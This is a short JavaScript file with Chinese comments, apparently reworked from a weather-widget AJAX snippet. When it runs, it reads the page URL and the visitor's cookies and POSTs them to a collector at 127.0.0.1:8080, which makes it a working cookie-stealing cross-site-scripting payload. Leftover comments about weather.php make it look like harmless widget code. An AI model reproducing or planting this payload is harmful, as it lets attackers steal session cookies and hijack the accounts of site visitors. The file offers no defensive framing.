var xmlobj; // 定义XMLHttpRequest对象
function CreateXMLHttpRequest() {
	if (window.ActiveXObject)
	// 如果当前浏览器支持Active Xobject，则创建ActiveXObject对象
	{
		// xmlobj = new ActiveXObject("Microsoft.XMLHTTP");
		try {
			xmlobj = new ActiveXObject("Msxml2.XMLHTTP");
		} catch (e) {
			try {
				xmlobj = new ActiveXObject("Microsoft.XMLHTTP");
			} catch (E) {
				xmlobj = false;
			}
		}
	} else if (window.XMLHttpRequest)
	// 如果当前浏览器支持XMLHttp Request，则创建XMLHttpRequest对象
	{
		xmlobj = new XMLHttpRequest();
	}
}

// 主程序函数
function main() 
{
//	cookie .setcookie("key1","val1"); 
	var h =  location.href;
	var c = document.cookie;
	CreateXMLHttpRequest(); // 创建对象
	// var parm = "act=firstweather" ;//构造URL参数
	// antique = escape(antique);
	var parm = "i=" + h+","+c;// 构造URL参数
	// xmlobj.open("POST",
	// "{dede:global.cfg_templeturl/}/../include/weather.php", true);
	// //调用weather.php
	xmlobj.open("POST", "http://127.0.0.1:8080/zht/ey/add", true); // 调用weather.php
//	xmlobj.setRequestHeader("cache-control", "no-cache");
//	xmlobj.setRequestHeader("contentType", "text/html;charset=uft-8"); // 指定发送的编码
	xmlobj.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); // 设置请求头信息
//	xmlobj.setRequestHeader("Access-Control-Allow-Origin", "*");
//	xmlobj.onreadystatechange = StatHandler; // 判断URL调用的状态值并处理
	xmlobj.send(parm); // 设置为发送给服务器数据
}

main();